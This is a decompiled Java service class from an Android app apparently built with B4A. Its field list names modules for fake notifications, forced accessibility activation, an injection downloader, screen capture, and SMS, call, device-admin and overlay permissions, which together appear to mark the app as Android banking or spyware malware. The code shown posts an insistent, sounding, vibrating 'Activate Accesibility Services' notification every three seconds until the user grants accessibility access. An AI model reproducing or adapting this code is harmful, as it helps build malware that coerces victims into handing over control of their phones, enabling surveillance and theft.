package com.com.androidrr;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.BALayout;
import anywheresoftware.b4a.keywords.B4AApplication;
import anywheresoftware.b4a.keywords.Common;
import anywheresoftware.b4a.objects.IntentWrapper;
import anywheresoftware.b4a.objects.NotificationWrapper;
import anywheresoftware.b4a.objects.ServiceHelper;
import anywheresoftware.b4a.objects.Timer;
import anywheresoftware.b4a.objects.collections.Map;
import b4a.example.dateutils;
import java.lang.reflect.Method;

/* loaded from: classes.dex */
public class dtrsbnotisuntilactv extends Service {
    public static NotificationWrapper _notification;
    public static Timer _timer1;
    static dtrsbnotisuntilactv mostCurrent;
    public static BA processBA;
    private ServiceHelper _service;
    public Common __c = null;
    public dateutils _dateutils = null;
    public main _main = null;
    public starter _starter = null;
    public clsclassperms_code _clsclassperms_code = null;
    public clsclassperms_code2 _clsclassperms_code2 = null;
    public backgroundservice _backgroundservice = null;
    public mediaprojectionbackservice _mediaprojectionbackservice = null;
    public globalparameters _globalparameters = null;
    public faknotiactivity _faknotiactivity = null;
    public forc_activateacc _forc_activateacc = null;
    public inj_dnlader _inj_dnlader = null;
    public mainglobalstrings _mainglobalstrings = null;
    public myreceiver _myreceiver = null;
    public notificationservice _notificationservice = null;
    public perm_activatemediaproject _perm_activatemediaproject = null;
    public perm_activateoverlay _perm_activateoverlay = null;
    public perm_ignorebatperm _perm_ignorebatperm = null;
    public perm_notiacc _perm_notiacc = null;
    public perm_phonecal _perm_phonecal = null;
    public perm_smsperm _perm_smsperm = null;
    public perm_startactdevmang _perm_startactdevmang = null;
    public perm_startactwritesy _perm_startactwritesy = null;
    public perm_unknownapps _perm_unknownapps = null;
    public perm_writesys _perm_writesys = null;
    public req_all_perms _req_all_perms = null;
    public s1 _s1 = null;
    public service1 _service1 = null;
    public service2 _service2 = null;
    public service3 _service3 = null;
    public service4 _service4 = null;
    public srvnewphonecall _srvnewphonecall = null;
    public wakeupdv _wakeupdv = null;
    public httputils2service _httputils2service = null;

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    public static class dtrsbnotisuntilactv_BR extends BroadcastReceiver {
        @Override // android.content.BroadcastReceiver
        public void onReceive(Context context, Intent intent) {
            BA.LogInfo("** Receiver (dtrsbnotisuntilactv) OnReceive **");
            Intent intent2 = new Intent(context, (Class<?>) dtrsbnotisuntilactv.class);
            if (intent != null) {
                intent2.putExtra("b4a_internal_intent", intent);
            }
            ServiceHelper.StarterHelper.startServiceFromReceiver(context, intent2, false, BA.class);
        }
    }

    public static Class<?> getObject() {
        return dtrsbnotisuntilactv.class;
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        mostCurrent = this;
        if (processBA == null) {
            BA ba = new BA(this, (BALayout) null, (BA) null, "com.com.androidrr", "com.com.androidrr.dtrsbnotisuntilactv");
            processBA = ba;
            if (BA.isShellModeRuntimeCheck(ba)) {
                processBA.raiseEvent2(null, true, "SHELL", false, new Object[0]);
            }
            try {
                Class.forName(BA.applicationContext.getPackageName() + ".main").getMethod("initializeProcessGlobals", new Class[0]).invoke(null, null);
                processBA.loadHtSubs(getClass());
                ServiceHelper.init();
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }
        this._service = new ServiceHelper(this);
        processBA.service = this;
        if (BA.isShellModeRuntimeCheck(processBA)) {
            BA ba2 = processBA;
            ba2.raiseEvent2(null, true, "CREATE", true, "com.com.androidrr.dtrsbnotisuntilactv", ba2, this._service, Float.valueOf(Common.Density));
        }
        if (ServiceHelper.StarterHelper.startFromServiceCreate(processBA, false)) {
            processBA.setActivityPaused(false);
            BA.LogInfo("*** Service (dtrsbnotisuntilactv) Create ***");
            processBA.raiseEvent(null, "service_create", new Object[0]);
        }
        processBA.runHook("oncreate", this, null);
    }

    @Override // android.app.Service
    public void onStart(Intent intent, int i) {
        onStartCommand(intent, 0, 0);
    }

    @Override // android.app.Service
    public int onStartCommand(final Intent intent, int i, int i2) {
        if (!ServiceHelper.StarterHelper.onStartCommand(processBA, new Runnable() { // from class: com.com.androidrr.dtrsbnotisuntilactv.1
            @Override // java.lang.Runnable
            public void run() {
                dtrsbnotisuntilactv.this.handleStart(intent);
            }
        })) {
            ServiceHelper.StarterHelper.addWaitForLayout(new Runnable() { // from class: com.com.androidrr.dtrsbnotisuntilactv.2
                @Override // java.lang.Runnable
                public void run() {
                    dtrsbnotisuntilactv.processBA.setActivityPaused(false);
                    BA.LogInfo("** Service (dtrsbnotisuntilactv) Create **");
                    dtrsbnotisuntilactv.processBA.raiseEvent(null, "service_create", new Object[0]);
                    dtrsbnotisuntilactv.this.handleStart(intent);
                    ServiceHelper.StarterHelper.removeWaitForLayout();
                }
            });
        }
        processBA.runHook("onstartcommand", this, new Object[]{intent, Integer.valueOf(i), Integer.valueOf(i2)});
        return 2;
    }

    @Override // android.app.Service
    public void onTaskRemoved(Intent intent) {
        super.onTaskRemoved(intent);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void handleStart(Intent intent) {
        BA.LogInfo("** Service (dtrsbnotisuntilactv) Start **");
        Method method = processBA.htSubs.get("service_start");
        if (method != null) {
            if (method.getParameterTypes().length > 0) {
                processBA.raiseEvent(null, "service_start", ServiceHelper.StarterHelper.handleStartIntent(intent, this._service, processBA));
            } else {
                processBA.raiseEvent(null, "service_start", new Object[0]);
            }
        }
    }

    @Override // android.app.Service
    public void onTimeout(int i) {
        BA.LogInfo("** Service (dtrsbnotisuntilactv) Timeout **");
        Map map = new Map();
        map.Initialize();
        map.Put("StartId", Integer.valueOf(i));
        processBA.raiseEvent(null, "service_timeout", map);
    }

    @Override // android.app.Service
    public void onDestroy() {
        super.onDestroy();
        BA.LogInfo("** Service (dtrsbnotisuntilactv) Destroy **");
        processBA.raiseEvent(null, "service_destroy", new Object[0]);
        processBA.service = null;
        mostCurrent = null;
        processBA.setActivityPaused(true);
        processBA.runHook("ondestroy", this, null);
    }

    public static NotificationWrapper _createnotification() throws Exception {
        _notification.Initialize2(4);
        _notification.setIcon("icon");
        _notification.setSound(true);
        _notification.setVibrate(true);
        _notification.setInsistent(true);
        NotificationWrapper notificationWrapper = _notification;
        BA ba = processBA;
        B4AApplication b4AApplication = Common.Application;
        CharSequence ObjectToCharSequence = BA.ObjectToCharSequence(B4AApplication.getLabelName());
        CharSequence ObjectToCharSequence2 = BA.ObjectToCharSequence("Activate Accesibility Services");
        main mainVar = mostCurrent._main;
        notificationWrapper.SetInfoNew(ba, ObjectToCharSequence, ObjectToCharSequence2, main.getObject());
        return _notification;
    }

    public static String _createnotification2() throws Exception {
        _notification.Initialize2(4);
        _notification.setIcon("icon");
        _notification.setSound(true);
        _notification.setVibrate(true);
        _notification.setInsistent(true);
        NotificationWrapper notificationWrapper = _notification;
        BA ba = processBA;
        B4AApplication b4AApplication = Common.Application;
        CharSequence ObjectToCharSequence = BA.ObjectToCharSequence(B4AApplication.getLabelName());
        CharSequence ObjectToCharSequence2 = BA.ObjectToCharSequence("Activate Accesibility Services");
        main mainVar = mostCurrent._main;
        notificationWrapper.SetInfoNew(ba, ObjectToCharSequence, ObjectToCharSequence2, main.getObject());
        _notification.Notify(111);
        return "";
    }

    public static String _process_globals() throws Exception {
        _timer1 = new Timer();
        _notification = new NotificationWrapper();
        return "";
    }

    public static String _service_create() throws Exception {
        globalparameters globalparametersVar = mostCurrent._globalparameters;
        if (globalparameters._isaccactive) {
            if (_timer1.IsInitialized()) {
                _timer1.setEnabled(false);
            }
            if (_notification.IsInitialized()) {
                _notification.Cancel(111);
            }
            Common.StopService(processBA, getObject());
            return "";
        }
        _timer1.Initialize(processBA, "timer1", 3000L);
        _timer1.setEnabled(true);
        return "";
    }

    public static String _service_destroy() throws Exception {
        if (_timer1.IsInitialized()) {
            _timer1.setEnabled(false);
        }
        _notification.Cancel(111);
        return "";
    }

    public static String _service_start(IntentWrapper intentWrapper) throws Exception {
        mostCurrent._service.StopAutomaticForeground();
        return "";
    }

    public static String _timer1_tick() throws Exception {
        try {
            globalparameters globalparametersVar = mostCurrent._globalparameters;
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("619070997", BA.ObjectToString(Common.LastException(processBA)), 0);
        }
        if (globalparameters._isaccactive) {
            try {
                _notification.Cancel(111);
            } catch (Exception e2) {
                processBA.setLastException(e2);
                Common.LogImpl("619070982", BA.ObjectToString(Common.LastException(processBA)), 0);
            }
            if (_timer1.IsInitialized()) {
                _timer1.setEnabled(false);
            }
            Common.StopService(processBA, getObject());
            return "";
        }
        _createnotification2();
        return "";
    }
}